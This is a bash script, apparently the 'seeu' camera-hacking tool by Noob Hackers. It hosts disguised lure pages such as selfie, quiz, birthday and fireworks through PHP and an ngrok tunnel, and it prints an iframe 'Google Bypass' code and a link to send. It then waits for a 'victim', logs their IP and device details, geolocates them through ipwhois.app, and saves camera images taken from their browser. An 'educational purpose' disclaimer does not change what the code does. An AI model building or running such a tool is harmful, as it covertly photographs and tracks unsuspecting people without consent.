dependencies() {
echo                                                                                                                                          
command -v zip > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed ZIP installing it....." && apt install zip > /dev/null 2>&1;}
command -v php > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed PHP installing it....." && apt install php > /dev/null 2>&1;}            
command -v curl > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed CURL installing it....." && apt install curl > /dev/null 2>&1;}
command -v wget > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed WGET installing it....." && apt install wget > /dev/null 2>&1;}
command -v git > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed GIT installing it....." && apt install git > /dev/null 2>&1;}
echo
}
dependencies
banner() {
clear
echo -e '\e[91m
\e[92m               ,-""-.
\e[92m              / ,--. \
\e[92m             | ( \e[91m()\e[92m ) |  \e[93m┌─┐┌─┐┌─┐ \e[92m┬ ┬
\e[92m              \ `--` /   \e[93m└─┐├┤ ├┤  \e[92m│ │
\e[92m               `-..-`    \e[93m└─┘└─┘└─┘ \e[92m└─┘'
echo
echo -e '            \e[92m::: Tool By Noob Hackers :::\e[0m'
echo -e '          \e[92m::: github.com/noob-hackers :::\e[0m'
echo -e "\e[92m"
echo -e '                \e[100m CaMera HackiNg Tool\e[0m'
echo
}
menu() {
echo -e "                    \e[93m[\e[32m1\e[93m]\e[93m➟ \e[92mSTART\e[0m"
echo -e "                    \e[93m[\e[32m2\e[93m]\e[93m➟ \e[92mUPDATE\e[0m"
echo -e "                    \e[93m[\e[32m3\e[93m]\e[93m➟ \e[92mABOUT\e[0m"
echo -e "                    \e[93m[\e[32m4\e[93m]\e[93m➟ \e[92mMORE\e[0m"
echo -e "                    \e[93m[\e[32m5\e[93m]\e[93m➟ \e[92mFOLLOW\e[0m"
echo -e "                    \e[93m[\e[32m6\e[93m]\e[93m➟ \e[92mVIDEO\e[0m"
echo -e "                    \e[93m[\e[32m7\e[93m]\e[93m➟ \e[92mCHAT NOW\e[0m"
echo -e "                    \e[93m[\e[32m8\e[93m]\e[93m➟ \e[92mRESTART\e[0m"
echo -e "                    \e[93m[\e[32m0\e[93m]\e[93m➟ \e[92mEXIT\e[0m"
echo 
echo -ne "\e[92mSelect Option\e[92m: \e[34m" 
read sit
if [[ "$sit" = "1" || "$sit" = "one" ]];
then 
pagemenu
elif [[ "$sit" = "2" || "$sit" = "two" ]];
then
echo -e  "                    SOON I WILL UPDATE"
elif [[ "$sit" = "3" || "$sit" = "three" ]];
then
about
elif [[ "$sit" = "4" || "$sit" = "four" ]];
then
xdg-open https://noobhacktube.com 2>/dev/null
elif [[ "$sit" = "5" || "$sit" = "five" ]];
then
xdg-open https://noob-hackers.github.io/noobspage 2>/dev/null
elif [[ "$sit" = "6" || "$sit" = "six" ]];
then
xdg-open https://bit.ly/nhytchannel > /dev/null 2>&1
elif [[ "$sit" = "7" || "$sit" = "seven" ]];
then
xdg-open https://bit.ly/nhwhatschat > /dev/null 2>&1
elif [[ "$sit" = "8" || "$sit" = "eight" ]];
then
cd $HOME/seeu
bash seeu.sh
elif [[ "$sit" = "0" || "$sit" = "zero" ]];
then
exit 1
else
echo -e "\e[93m             You Typed It Wrong broooo.....\e[0m"
exit 1
fi
}

pagemenu() {
banner
echo -e "                    \e[93m[\e[32m1\e[93m]\e[93m➟ \e[92mSelFie\e[0m"
echo -e "                    \e[93m[\e[32m2\e[93m]\e[93m➟ \e[92mQuIz\e[0m"
echo -e "                    \e[93m[\e[32m3\e[93m]\e[93m➟ \e[92mGuEss\e[0m"
echo -e "                    \e[93m[\e[32m4\e[93m]\e[93m➟ \e[92mSpinWheel\e[0m"
echo -e "                    \e[93m[\e[32m5\e[93m]\e[93m➟ \e[92mHopGame\e[0m"
echo -e "                    \e[93m[\e[32m6\e[93m]\e[93m➟ \e[92mBirthDay\e[0m"
echo -e "                    \e[93m[\e[32m7\e[93m]\e[93m➟ \e[92mWishBook\e[0m"
echo -e "                    \e[93m[\e[32m8\e[93m]\e[93m➟ \e[92mRPSGame\e[0m"
echo -e "                    \e[93m[\e[32m9\e[93m]\e[93m➟ \e[92mFireWorks\e[0m"
echo -e "                    \e[93m[\e[32m10\e[93m]\e[93m➟ \e[92mHappyNewYear\e[0m"
echo
echo -ne "\e[92mSelect Option\e[92m: \e[34m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "selfie" ]];
then
site="selfie"
rm -rf webs/$site/even.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "quiz" ]]
then
site="quiz"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "3" || "$selc" == "three" || "$selc" == "guess" ]]
then
site="guess"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "4" || "$selc" == "four" || "$selc" == "spinwheel" ]]
then
site="spinwheel"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "5" || "$selc" == "five" || "$selc" == "hopgame" ]] 
then
site="game"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "6" || "$selc" == "six" || "$selc" == "birthday" ]]
then
birthday
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "7" || "$selc" == "seven" || "$selc" == "wishbook" ]]
then
book
elif [[ "$selc" == "8" || "$selc" == "eight" || "$selc" == "rpsgame" ]]
then
site="rps"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "9" || "$selc" == "nine" || "$selc" == "firework" ]]
then
firework
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "10" || "$selc" == "ten" || "$selc" == "hny" ]]
then
boxwish
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "00" || "$selc" == "exit" || "$selc" == "exit" ]]
then
banner
menu
fi
}

birthday() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="birthday"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="birthday"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read person
echo "Wish Message: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "6s|\(.*\)|<legend>  <h2 class="text_head">$event</h2></legend>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "7s|\(.*\)|<h2 class="text">$person</h2>|" webs/$site/option.html > random.html && mv random.html webs/$site
sed "8s|\(.*\)|<h2 class="text">$msg</h2>|" webs/$site/random.html > custom.html && mv custom.html webs/$site
rm -rf webs/$site/random.html > /dev/null 2>&1
start
fi
}

book() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="book"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="book"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mWish Message: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "32s|\(.*\)|<p id="head">$event</p>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "33s|\(.*\)|<p>$msg</p>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

firework() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="firework"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="firework"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "5s|\(.*\)|<center><h1>$event</h1><center>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "7s|\(.*\)|<h2>$msg<h2>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

boxwish() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="boxwish"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="boxwish"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "   \e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read person
echo
echo -e "    \e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "10s|\(.*\)|<h1>$event</h1>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "11s|\(.*\)|<h2>$person</h2>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

start() {

if [[ -e webs/$site/ip.txt ]]; then
rm webs/$site/ip.txt 2>&1
fi

if [[ -e webs/$site/index.php ]]; then
rm  webs/$site/index.php 2>&1
fi

if [[ -e webs/$site/index.html ]]; then
rm  webs/$site/index.html 2>&1
fi

if [[ -e webs/$site/Log.log ]]; then
rm webs/$site/Log.log 2>&1
fi

if [[ -e webs/$site/template.html ]]; then
rm  webs/$site/template.html 2>&1
fi

if [[ -e ngrok ]]; then
echo ""
else
echo
printf "\e[1;92m[\e[34m•\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm')
if [[ $arch == *'arm'* ]]; then
wget https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-2.2.8-linux-arm.zip ]]; then
unzip ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm.zip
else                                                                                                                  
echo
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"                              
exit 1
fi
else
wget https://github.com/noob-hackers/impstuff/raw/main/ngrok%2Bwifi%2Bdata.zip > /dev/null 2>&1
if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1                                                            
chmod +x ngrok                                                                                   
rm -rf ngrok+wifi+data.zip
else
echo
printf "\e[1;93m[!] Unable to download \e[0m\n"
exit 1
fi                         
fi
fi                                                                                                                   

if [[ -e webs/$site/option.html ]]; then
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
cd webs/$site && mv custom.html template.html && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
else
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
cd webs/$site && cp $site.html template.html && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
fi
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
stat=$(echo "$status")
if [ "$stat" = "200" ];
then
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[0m200\e[34m]\e[0m"
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
echo
sed 's+forwarding_link+'$link'+g' webs/$site/template.html > webs/$site/index.html
sed 's+forwarding_link+'$link'+g' webs/$site/forward.php > webs/$site/index.php
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
checkfound
else
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[91m000\e[34m]\e[0m"
echo
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
sed 's+forwarding_link+'$link'+g' webs/$site/template.html > webs/$site/index.html
sed 's+forwarding_link+'$link'+g' webs/$site/forward.php > webs/$site/index.php
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
#merge
checkfound
fi
}

checkfound() {
echo ' '
echo -e "\e[1;93m[\e[0m\e[34m•\e[0m\e[1;93m] Waiting for victim to open link...\e[0m\n"
while [ true ]; do
if [[ -e "webs/$site/ip.txt" ]]; then
echo
echo -e "\e[92m------------------------\e[34mVICTIM FOUND\e[92m-------------------------\e[0m"
echo ' '
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Device info found..."
echo ' '
catch_ip
sleep 1.0
fi
done 
}

catch_ip() {
ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'  webs/$site/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' webs/$site/ip.txt | cut -d '"' -f2)
echo -e "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m$ua\e[0m\e[1;77m\e[0m\n"
chk=$(fmt -20 webs/$site/ip.txt)
sch=$(echo "$chk" > cod.txt)                                                                                                         
dom1=$(sed -n '5p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom2=$(sed -n '6p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom3=$(sed -n '7p' cod.txt | cut -d";" -f2 | cut -d")" -f1)
dom4=$(sed -n '11p' cod.txt | cut -d "/" -f1)
dom5=$(sed -n '11p' cod.txt | cut -d " " -f2 | cut -d"/" -f2)
dom6=$(sed -n '12p' cod.txt | cut -d"(" -f2 | cut -d")" -f1)
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Kernel:\e[1;0m$dom1\e[0m" 
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Os:\e[1;0m$dom2\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Model:\e[1;0m$dom3\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Browser:\e[0m$dom4\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Version:\e[1;0m$dom5\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m★ \e[0m\e[1;92m] Device:\e[1;0m$dom6\e[0m"
cat webs/$site/ip.txt >> webs/$site/saved.ip.txt

if [[ -e location.txt ]]; then
rm -rf location.txt
fi

IFS='\n'
iptracker=$(curl -s -L "http://ipwhois.app/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
IFS=$'\n'
iptt=$(sed -n 's/"ip"://p' track.txt)

if [[ $iptt != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Device ip: \e[0m$iptt\e[0m"
fi

iptype=$(sed -n 's/"type"://p' track.txt)
if [[ $iptype != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] IP type: \e[0m$iptype\e[0m" 
fi

continent=$(sed -n 's/"continent"://p' track.txt)
if [[ $continent != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Continent: \e[0m$continent\e[0m" 
fi

country=$(sed -n 's/"country"://p' track.txt)
if [[ $country != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Country: \e[0m$country\e[0m"
fi

flag=$(sed -n 's/"country_flag"://p' track.txt)
if [[ $flag != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country flag: \e[0m$flag\e[0m"
fi

cap=$(sed -n 's/"country_capital"://p' track.txt)
if [[ $cap != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country capital: \e[0m$cap\e[0m"
fi

phon=$(sed -n 's/"country_phone"://p' track.txt)
if [[ $phon != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country code: \e[0m$phon\e[0m"
fi

region=$(sed -n 's/"region"://p' track.txt)
if [[ $region != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] State: \e[0m$region\e[0m"
fi

city=$(sed -n 's/"city"://p' track.txt)
if [[ $city != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] City: \e[0m$city\e[0m"
fi

isp=$(sed -n 's/"isp"://p' track.txt)
if [[ $isp != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Isp: \e[0m$isp\e[0m" 
fi

ccode=$(sed -n 's/"currency_code"://p' track.txt)
if [[ $ccode != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Currency code: \e[0m$ccode\e[0m"
fi
echo ""
imgrcv
}

imgrcv() {
echo " "
echo -e "\e[1;93m[\e[0m\e[34m•\e[0m\e[1;93m] Waiting For Image...\e[0m\n"
while [ true ]; do
if [[ -e "webs/$site/Log.log" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Image Recieved..."
sleep 6.0
mv -f webs/$site/*.png /sdcard > /dev/null 2>&1
echo " "
echo -e  "\e[1;92m[\e[34m•\e[1;92m]\e[1;34m Image Moved To Gallery..."
rm webs/$site/ip.txt > /dev/null 2>&1
rm webs/$site/Log.log > /dev/null 2>&1
echo
echo -e "\e[92m---------------------\e[34mCHECK YOUR GALLERY\e[92m----------------------\e[0m"
echo
checkfound
fi
done
}

about() {
clear
echo -e '\e[96m                       ----------------'
echo -e '\e[92m                       ┌─┐┌┐ ┌─┐┬ ┬┌┬┐
                       ├─┤├┴┐│ ││ │ │ 
                       ┴ ┴└─┘└─┘└─┘ ┴ '
echo -e '\e[96m                       ----------------'
echo -e '\e[96m      |------------------|'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 1.5
echo -e '\e[96m     [\e[92m+\e[96m]-------[\e[92mNITRO\e[96m]'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 1.0
echo -e '\e[96m     [\e[92m+\e[96m]-------[\e[92mTOOL\e[96m]'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 2.0
echo -e '\e[96m     [\e[92m+\e[96m]--------------'
echo -e '\e[96m                      |'
echo -e '\e[92m  THIS TOOLS IS ONLY FOR EDUCATIONAL PURPOSE SO'
echo -e '\e[92m IM NOT RESPONSIBLE IF YOU DO ANY ILLEGAL THINGS'
echo -e '\e[92m   THANKS FOR READING SUBSCRIBE {NOOB HACKERS}'
echo -e '\e[92m           HAVE A GOOD DAY BUDDIE :)'
echo -e '\e[96m                      |'
echo -e '\e[96m                      |'
sleep 4.5
echo -e '\e[96m                     [\e[92m+\e[96m]------------[\e[92mBYE\e[96m]\e[0m'
sleep 2.0
cd $HOME/seeu
clear
bash seeu.sh
}

banner
menu
